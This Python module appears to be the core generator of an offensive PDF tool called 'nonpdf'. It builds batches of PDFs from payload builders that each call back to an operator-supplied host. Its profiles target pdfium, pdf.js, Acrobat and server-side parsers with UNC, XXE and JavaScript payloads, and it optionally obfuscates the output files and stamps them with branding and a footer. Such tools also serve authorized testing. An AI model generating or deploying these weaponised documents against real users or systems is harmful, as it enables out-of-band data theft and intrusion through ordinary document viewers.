from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path

from nonpdf.core.branding import (
    BRAND, CREATOR, FOOTER_TEXT, INFO_DICT, PDF_HEADER_COMMENT, PRODUCER,
)
from nonpdf.core.obfuscator import obfuscate_pdf
from nonpdf.core.registry import Registry, registry
from nonpdf.util.fs import ensure_dir


PROFILES: dict[str, dict[str, list[str]]] = {
    # profile -> filter spec; '*' = everything
    "full":    {"ids": ["*"]},
    "quick":   {"tags": ["quick"]},
    "web":     {"platform": "pdfium"},
    "pdfjs":   {"platform": "pdfjs"},
    "acrobat": {"platform": "acrobat"},
    "server":  {"platform": "server"},
    "unc":     {"tags": ["unc"]},
    "xxe":     {"tags": ["xxe"]},
    "js":      {"tags": ["javascript"]},
}


@dataclass
class BuildResult:
    path: Path
    entry_id: str
    description: str


class Generator:
    def __init__(self, callback: str, output_dir: str | Path,
                 profile: str = "full", obfuscate: int = 0,
                 reg: Registry | None = None) -> None:
        self.callback = callback
        self.output_dir = ensure_dir(Path(output_dir))
        self.profile = profile
        self.obfuscate = obfuscate
        self.reg = reg or registry

    def _select(self, only: list[str] | None) -> list:
        if only:
            return self.reg.filter(ids=only)
        spec = PROFILES.get(self.profile, PROFILES["full"])
        if spec.get("ids") == ["*"]:
            return self.reg.all()
        return self.reg.filter(
            platform=spec.get("platform"),
            tags=spec.get("tags"),
        )

    def run(self, only: list[str] | None = None) -> list[BuildResult]:
        results: list[BuildResult] = []
        for entry in self._select(only):
            data = entry.builder(host=self.callback)
            data = self._brand(data)
            path = self.output_dir / f"{entry.id}_{entry.name}.pdf"
            path.write_bytes(data)
            if self.obfuscate:
                obfuscate_pdf(path, self.obfuscate)
            results.append(BuildResult(path=path, entry_id=entry.id,
                                       description=entry.description))
        return results

    def _brand(self, data: bytes) -> bytes:
        """Apply Anonymous-beta metadata signature to a PDF blob.

        Injects: header comment, /Info dict in trailer, and a visible
        footer credit line into the first uncompressed BT/ET content stream.
        """
        # header comment
        nl = data.find(b'\n')
        if nl != -1 and data.startswith(b'%PDF'):
            data = data[:nl + 1] + PDF_HEADER_COMMENT + data[nl + 1:]

        # /Info in trailer
        tidx = data.rfind(b'trailer')
        if tidx != -1:
            section = data[tidx:]
            if b'/Info' not in section:
                last = section.rfind(b'>>')
                if last != -1:
                    pos = tidx + last
                    data = data[:pos] + INFO_DICT + b'\n' + data[pos:]

        # visible footer
        data = self._append_footer(data)
        return data

    @staticmethod
    def _append_footer(data: bytes) -> bytes:
        import re
        pattern = re.compile(
            rb'(\d+\s+0\s+obj\s*<<)([^>]*?)(/Length\s+)(\d+)([^>]*?)(>>\s*\nstream\n)(.*?)(\nendstream)',
            re.DOTALL,
        )
        for m in pattern.finditer(data):
            dict_body = m.group(2) + m.group(5)
            body = m.group(7)
            if b'/Filter' in dict_body:
                continue
            if b'BT' not in body or b'ET' not in body:
                continue
            fm = re.search(rb'(/F\d+)\s+\d+(?:\.\d+)?\s+Tf', body)
            if not fm:
                continue
            font = fm.group(1)
            footer = b'\n  BT ' + font + b' 8 Tf 30 15 Td (' + FOOTER_TEXT.encode() + b') Tj ET'
            new_body = body + footer
            new_obj = (
                m.group(1) + m.group(2) + m.group(3)
                + str(len(new_body)).encode()
                + m.group(5) + m.group(6) + new_body + m.group(8)
            )
            return data[:m.start()] + new_obj + data[m.end():]
        return data
